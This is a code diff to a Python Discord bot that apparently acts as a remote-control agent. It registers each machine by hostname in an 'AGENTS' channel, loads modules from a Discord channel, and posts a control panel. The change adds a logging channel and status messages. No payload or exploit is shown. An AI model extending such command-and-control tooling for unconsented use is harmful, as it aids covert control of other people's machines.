@@ -11,7 +11,9 @@ HOSTNAME = socket.gethostname()
 
 MODULES_CATEGORY_NAME = "MODULES"
 AGENTS_CATEGORY_NAME = "AGENTS"
+LOGS_CATEGORY_NAME = "LOGS"
 MODULES_CHANNEL_NAME = "modules"
+LOGS_CHANNEL_NAME = "logs"
 
 start_time = time.time()
 
@@ -19,6 +21,7 @@ start_time = time.time()
 modules = {}
 modules_channel = None
 agent_channel = None
+logs_channel = None
 panel = None
 
 def public_ip():
@@ -82,24 +85,32 @@ def embed():
     return e
 
 async def refresh_modules():
+    await send_log("Refreshing modules")
     pass
+    await send_log("Module refresh complete")
 
 async def move_panel():
     global panel
 
     if not agent_channel:
+        await send_log("Cannot move panel - agent channel unavailable")
         return
+
+    await send_log("Moving control panel")
 
     if panel:
         try:
             await panel.delete()
+            await send_log("Previous control panel deleted")
         except discord.NotFound:
+            await send_log("Previous control panel was already deleted")
             pass
 
     panel = await agent_channel.send(
         embed=embed(),
         view=ModuleView()
     )
+    await send_log("New control panel created")
 
 
 class ModuleView(discord.ui.View):
@@ -117,14 +128,23 @@ class ModuleView(discord.ui.View):
         async def refresh_callback(interaction):
             await interaction.response.defer()
 
+            await send_log(
+                f"Panel refresh requested by {interaction.user}"
+            )
+
             await refresh_modules()
             await move_panel()
+
+            await send_log("Panel refresh complete")
         
         refresh_button.callback = refresh_callback
         self.add_item(refresh_button)
 
+async def send_log(text):
+    await logs_channel.send(f"[{HOSTNAME}] {text}")
+
 async def setup():
-    global agent_channel, modules_channel, panel
+    global agent_channel, modules_channel, logs_channel, panel
     guild = bot.get_guild(GUILD_ID)
 
     if not guild:
@@ -147,14 +167,14 @@ async def setup():
         name=HOSTNAME
     )
 
-        modules_category = discord.utils.get(
+    modules_category = discord.utils.get(
         guild.categories,
         name=MODULES_CATEGORY_NAME
     )
 
     if not modules_category:
         print("[!] MODULES Category not found")
-        return
+        exit()
 
     modules_channel = discord.utils.get(
         modules_category.text_channels,
@@ -166,8 +186,36 @@ async def setup():
         exit()
     
 
+    logs_category = discord.utils.get(
+        guild.categories,
+        name=LOGS_CATEGORY_NAME
+    )
+
+    if not logs_category:
+        print("[!] LOGS Category not found")
+        exit()
+
+    logs_channel = discord.utils.get(
+        logs_category.text_channels,
+        name=LOGS_CHANNEL_NAME
+    )
+
+    if not logs_channel:
+        print("[!] Modules Channel not found")
+        exit()
+
+    await send_log("Agent connected to Discord")
+    await send_log("Guild successfully located")
+    await send_log("AGENTS category located")
+    await send_log("MODULES category located")
+    await send_log("Modules channel located")
+    await send_log("LOGS category located")
+    await send_log("Logs channel located")
+    
+
     # Create the channel if it doesn't exist
     if not agent_channel:
+        await send_log("Agents channel not found - creating it!")
 
         print("[!] AGENTS Channel not found")
 
@@ -175,13 +223,15 @@ async def setup():
             HOSTNAME,
             category=category
         )
-
+        await send_log("Agent channel created")
         print(f"[+] AGENTS Channel created: #{HOSTNAME}")
 
     else:
+        await send_log("Agent channel found")
         print(f"[+] AGENTS Channel found: #{HOSTNAME}")
 
     # Create the panel
+    await send_log("sending control panel to Agent channel")
     panel = await agent_channel.send(
         embed=embed(),
         view=ModuleView()
